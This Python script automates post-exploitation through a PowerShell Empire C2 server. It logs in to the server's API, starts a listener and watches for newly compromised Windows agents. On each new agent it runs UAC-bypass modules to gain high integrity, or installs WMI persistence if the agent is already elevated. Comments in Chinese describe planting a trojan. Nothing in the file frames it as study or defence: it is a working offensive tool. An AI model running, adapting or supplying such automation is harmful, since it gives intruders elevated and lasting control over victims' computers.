# /usr/bin/env python3
# -*- coding: utf-8 -*-  
# usage : python auto_recon.py -u username -p password --url http://url:port -lip ip -lp

import requests
import argparse
import signal
import sys
import re
import threading
#from termcolor import colored
from argparse import RawTextHelpFormatter
from time import sleep
from requests import ConnectionError
from termcolor import colored
from requests.packages.urllib3.exceptions import InsecureRequestWarning
requests.packages.urllib3.disable_warnings(InsecureRequestWarning)

__version__ = '0.0.1'

class KThread(threading.Thread):
    """
    A subclass of threading.Thread, with a kill() method.
    From https://web.archive.org/web/20130503082442/http://mail.python.org/pipermail/python-list/2004-May/281943.html
    """

    def __init__(self, *args, **keywords):
        threading.Thread.__init__(self, *args, **keywords)
        self.killed = False

    def start(self):
        """Start the thread."""
        self.__run_backup = self.run
        self.run = self.__run      # Force the Thread toinstall our trace.
        threading.Thread.start(self)

    def __run(self):
        """Hacked run function, which installs the trace."""
        sys.settrace(self.globaltrace)
        self.__run_backup()
        self.run = self.__run_backup

    def globaltrace(self, frame, why, arg):
        if why == 'call':
            return self.localtrace
        else:
            return None

    def localtrace(self, frame, why, arg):
        if self.killed:
            if why == 'line':
                raise SystemExit()
        return self.localtrace

    def kill(self):
        self.killed = True

def login(username , password):
    payload = {'username': username,
               'password': password}
    print('Powering up ......')
    
    r = requests.post(base_url+'/api/admin/login', json = payload, headers = headers , verify = False)
        
    if r.status_code == 200:
        token['token'] = r.json()['token']
    else:
        print('I find your lack of faith disturbing...(Authentication Failed)')
        sys.exit(1)

def get_listener_by_name(listener_name = "http1"):
    r = requests.get(base_url+'/api/listeners/{}'.format(listener_name), params = token , verify = False)
    if r.status_code == 200:
        return r.json()
    return False
    
def start_listener(listener_options, listener_type = 'http1'):
    r = requests.post(base_url + '/api/listeners/{}'.format(listener_type), params = token , headers = headers, json = listener_options ,verify=False)
    if r.status_code == 200:
        r = r.json()
        print('Create listener => {}'.format(r))

# change . store response json object ,
def get_agents():
    r = requests.get(base_url + '/api/agents', params=token, verify=False)
    if r.status_code == 200:
        return r.json()
    print(r.json())
    raise
    
#取消了r.json的显示
def get_agent_results(agent_name):     #获取agent_name 执行结果
    r = requests.get(base_url + '/api/agents/{}/results'.format(agent_name), params=token, verify=False)
    if r.status_code == 200:
        #print(r.json())
        return r.json()
    #print(r.json())
    raise
    
def agent_finished_initializing(agent_dict):    #判断agent有没初始化完成。
    '''
    If these values are None it means the agent hasn't finished initializing on the target
    '''
    if agent_dict['username'] is None or agent_dict['hostname'] is None or agent['os_details'] is None:
        return False
    return True


# 这里明明只有执行一次。
def execute_module(module_name, agent_name, module_options=None):    #执行一个模块
    payload = {'Agent': agent_name}
    if module_options:
        payload.update(module_options)
    try:
        r = requests.post(base_url + '/api/modules/{}'.format(module_name), params=token, headers=headers, json=payload, verify=False)
        if r.status_code == 200:
            r = r.json()
            if debug: print_debug("Executed Module => success: {} taskID: {} msg: '{}'".format(r['success'], r['taskID'], r['msg']), agent_name)
            return r
        else:
            print_bad("Error executing module '{}': {}".format(module_name, r.json()), agent_name)
    except Exception as e:
        print_bad("Error executing module '{}': {}".format(module_name, e), agent_name)

#修改过，原版的api 有变化
def execute_module_with_results(module_name, agent_name, module_options = None):
    r = execute_module(module_name, agent_name, module_options)
    #while True:
    #    for result in get_agent_results(agent_name)['results']:
    #        if result['taskID'] == r['taskID']:
    #            if len(result['results'].split('\n')) > 1 or not result['results'].startswith('Job'):
    #                return result['result']
    #    sleep(2)
    for result in get_agent_results(agent_name)['results']:
        if r['success'] == True and result['AgentResults'] != None:
            if len(result['AgentResults']) > 1 or  result['AgentResults'][-1]:
                print(len(result['AgentResults']))
                return result['AgentResults']

# 如果不是高权限就提权如果是，就种入木马
def pwn_the_target(agent_name):
    print(agent_name)
    print(agents[agent_name]['username'])
    if not agents[agent_name]['high_integrity']:
            if '10' in agents[agent_name]['os']:
                print("Detected this agent is windows10 system，use two bypassuac!!!!!!!!!")
                bypassuac_env(agent_name)
                sleep(20)
                bypassuac_fodhelper(agent_name)
                return 
            bypassuac_eventvwr(agent_name)
            print("Bypassuac is started ! It will have a new High_integrity !\n")
    else:
        print("{} is a HighIntegrity Agent . Now Start Test Persistence Function".format(agent_name))
        if agents[agent_name]['username'] != "WORKGROUP\SYSTEM":
            print("{} is not System, persisting......".format(agent_name))
            persistence(agent_name)
        else:
            print("{} have been Persisted".format(agent_name))

# 执行bypassuac_env提权
# 提权成功会返回一个新的agent会话
def bypassuac_env(agent_name, listener='http1'):
    module_options = {"Listener": listener}
    
    print_info('Attempting to elevate using bypassuac_env', agent_name)
    execute_module_with_results('powershell/privesc/bypassuac_env', agent_name, module_options)

# 执行bypassuac_eventvwr提权
def bypassuac_eventvwr(agent_name, listener='http1'):
    module_options = {"Listener": listener}

    print_info('Attempting to elevate using bypassuac_eventvwr', agent_name)
    execute_module_with_results('powershell/privesc/bypassuac_eventvwr', agent_name, module_options)
    
# 执行bypassuse_fodhelper
def bypassuac_fodhelper(agent_name, listener="http1"):
    module_options = {"Listener": listener}
    print_info('Attempting to elevate using bypassuac_fodhelper', agent_name)
    execute_module_with_results('powershell/privesc/bypassuac_fodhelper', agent_name, module_options)
    
    
# 增加是否中过木马的判断，主机名和用户名都相同的情况来判断。
# 首先进入这个函数的都是高权限的客户端，名字里面不是SYSTEM的就是UAC后反弹回来的。
# 由于模块自身问题，会触发两次。
def persistence(agent_name, listener='http1'):
    module_options = {'Listener': listener}
    
    print_info('Attempting to persistence', agent_name)
    execute_module_with_results('powershell/persistence/elevated/wmi', agent_name, module_options)
    print("{} Persistence Done".format(agent_name))

def print_info(msg, agent_name=None):
    print(colored('[*]', 'blue') + '{}'.format(' Agent: {} => '.format(agent_name) if agent_name else ' ') + msg)


def print_good(msg, agent_name=None):
    print(colored('[+]', 'green') + '{}'.format(' Agent: {} => '.format(agent_name) if agent_name else ' ') + msg)


def print_bad(msg, agent_name=None):
    print(colored('[-]', 'red') + '{}'.format(' Agent: {} => '.format(agent_name) if agent_name else ' ') + msg)


def print_debug(msg, agent_name=None):
    print(colored('[DEBUG]', 'cyan') + '{}'.format(' Agent: {} => '.format(agent_name) if agent_name else ' ') + msg)


def print_win_banner():
    print('\n')
    print(colored('=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=', 'yellow'))
    print(colored('=-=-=-=-=-=-=-=-=-=-=-=-=-=-WIN-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=', 'yellow'))
    print(colored('=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=', 'yellow'))

    
if __name__ == '__main__':
    args = argparse.ArgumentParser( description = '''Automatic privilege maintenance''', formatter_class = RawTextHelpFormatter)
    
    args.add_argument('-u', '--username', type=str, default='empireadmin', help='Empire username (default: empireadmin)')
    args.add_argument('-p', '--password', type=str, default='Password123', help='Empire password (default: Password123)')
    args.add_argument('-lip', '--listener-ip', type=str, help='IP for the http1 listener (Empire should auto detect the IP, if not use this flag)')
    args.add_argument('-lp', '--listener-port', type=int, default=8443, metavar='PORT', help='Port to start the http1 listener on (default: 8443)')
    args.add_argument('-t', '--threads', type=int, default=20, help='Specifies the number of threads for modules to use (default: 20)')
    args.add_argument('--no-mimikatz', action='store_true', help='Do not use Mimikatz during lateral movement (default: False)')
    args.add_argument('--url', type=str, default='https://127.0.0.1:1337', help='Empire RESTful API URL (default: https://127.0.0.1:1337)')
    args.add_argument('--debug', action='store_true', help='Enable debug output')
    
    args = args.parse_args()
    
    headers = {'Content-Type': 'application/json'}
    token = {'token': None}
    
    tried_domain_privesc = False
    
    lock = threading.Lock()
    
    module_threads = args.threads
    base_url = args.url
    debug = args.debug
    
    agents = {}
    
    persisted_host = []
    
    agent_threads = {}
    recon_threads = {}
    privesc_threads = {}
    spread_threads = {}
    
    priority_targets = []    # List of boxes with admin sessions
    domain_controllers = []
    domain_admins = []
    spread_usernames = []    # List of accounts we already used to laterally spread
    psinject_usernames = []  # List of accounts we psinjected into
    spawned_usernames = []   # List of accounts we spawned agents with
    
    login(args.username, args.password)
    
    print(token['token'])
    
    if not get_listener_by_name():
        listener_opts = {'CertPath': 'data/', 'Name': 'http1', 'Port': args.listener_port}
        if args.listener_ip:
            listener_opts['Host'] = args.listener_ip

        start_listener(listener_opts)
        print('done')
        
    while True:
        for agent in get_agents()['agents']:
            agent_name = agent['name']
            if agent_name not in agents.keys() and agent_finished_initializing(agent):       #判断是否有新agent上线
                print_good(colored('New Agent'.format(agent['name']), 'yellow') + ' => Name: {} IP: {} HostName: {} UserName: {} HighIntegrity: {}'.format(agent['name'],
                                                                                                                                                       agent['external_ip'],
                                                                                                                                                       agent['hostname'],
                                                                                                                                                       agent['username'],
                                                                                                                                                       agent['high_integrity']))

                agents[agent_name] = {'id': agent['ID'],
                                  'ip': agent['external_ip'],
                                  'hostname': agent['hostname'],
                                  'username': agent['username'],
                                  'high_integrity': agent['high_integrity'],
                                  'os': agent['os_details']}
                agent_threads[agent_name] = KThread(target=pwn_the_target, args=(agent_name,))
                agent_threads[agent_name].start()
        sleep(5)
    sys.exit(0)

